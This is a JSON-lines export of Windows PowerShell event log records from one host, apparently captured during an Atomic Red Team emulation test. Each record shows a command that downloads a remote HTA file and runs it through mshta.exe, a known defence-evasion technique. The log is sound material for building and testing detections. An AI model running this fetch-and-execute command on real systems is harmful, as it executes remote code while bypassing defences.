{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:42.3814972"},"EventRecordID":"1094","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:42.4010846"},"EventRecordID":"1095","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:42.4304169"},"EventRecordID":"1096","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:42.4458596"},"EventRecordID":"1097","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:42.4458596"},"EventRecordID":"1098","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:42.4458596"},"EventRecordID":"1099","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:42.6785423"},"EventRecordID":"1100","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=632bdade-0b86-4b1f-8018-b2bf6f580620\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 14:13:43.5979102"},"EventRecordID":"1101","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=02ebcebd-b4e7-42e0-85e4-7b1586ef05e6\r\n\tHostApplication=powershell.exe &amp; {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=632bdade-0b86-4b1f-8018-b2bf6f580620\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
